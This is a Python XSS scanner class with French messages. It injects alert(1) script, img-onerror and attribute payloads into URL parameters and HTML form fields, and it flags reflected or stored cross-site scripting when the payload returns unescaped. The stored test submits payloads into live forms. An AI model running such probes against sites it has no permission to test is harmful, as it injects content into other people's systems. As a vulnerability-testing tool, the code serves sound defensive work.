from bs4 import BeautifulSoup
import requests
import base64
import time
from urllib.parse import urlparse, urlencode, parse_qs

class Attaque_xss:
    def __init__(self):
        self.payloads = [
            "<script>alert(1)</script>",
            "<img src='x' onerror='alert(1)'>",
            '" onmouseover=alert(1)"',
        ]
        self.encoded_payloads = [base64.b64encode(p.encode()).decode() for p in self.payloads]
        self.resultats = []

    def run_xss(self, url):
        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                return

            parsed_url = urlparse(url)
            params = list(parse_qs(parsed_url.query).keys())
            discovered_params = self.discover_params_from_html(response.text)
            all_params = list(set(params + discovered_params))

            self.test_reflected_xss(url, all_params)
            self.test_stored_xss(url, discovered_params)
        except requests.RequestException as e:
            print(f"[ERREUR] Problème avec l'URL {url}: {e}")

    def test_reflected_xss(self, url, params):
        for param in params:
            for payload in self.payloads + self.encoded_payloads:
                test_url = self.construct_url_with_payload(url, param, payload)
                try:
                    response = requests.get(test_url, timeout=10)
                    if response.status_code == 200:
                        # Vérifier si le payload est réellement injecté dans la page
                        if self.detect_xss_injection(response.text, payload):
                            print(f"[VULNÉRABLE] {url} - Paramètre {param} vulnérable à XSS Reflected avec {payload}")
                            self.resultats.append({"url": url, "param": param, "payload": payload})
                except requests.RequestException as e:
                    print(f"[ERREUR] Test échoué sur {url} avec {payload}: {e}")
                    continue

    def test_stored_xss(self, url, params):
        for param in params:
            for payload in self.payloads:
                try:
                    if self.submit_payload(url, param, payload) and self.check_payload_display(url, payload):
                        print(f"[VULNÉRABLE] {url} - Paramètre {param} vulnérable à XSS Stored avec {payload}")
                        self.resultats.append({"url": url, "param": param, "payload": payload})
                except requests.RequestException:
                    continue

    def discover_params_from_html(self, html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        return list({input_tag.get('name') for input_tag in soup.find_all('input') if input_tag.get('name')})

    def construct_url_with_payload(self, url, param, payload):
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        query_params[param] = [payload]
        return parsed_url._replace(query=urlencode(query_params, doseq=True)).geturl()

    def submit_payload(self, url, param, payload):
        response = requests.post(url, data={param: payload}, timeout=10)
        return response.status_code == 200

    def check_payload_display(self, url, payload):
        response = requests.get(url, timeout=10)
        return payload in response.text

    def detect_xss_injection(self, response_text, payload):
        # Vérifier si le payload est injecté dans la page sans échappement
        if payload in response_text and not self.is_escaped(response_text, payload):
            return True
        return False

    def is_escaped(self, response_text, payload):
        # Vérifier si le payload est échappé dans la réponse
        escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
        if escaped_payload in response_text:
            return True
        return False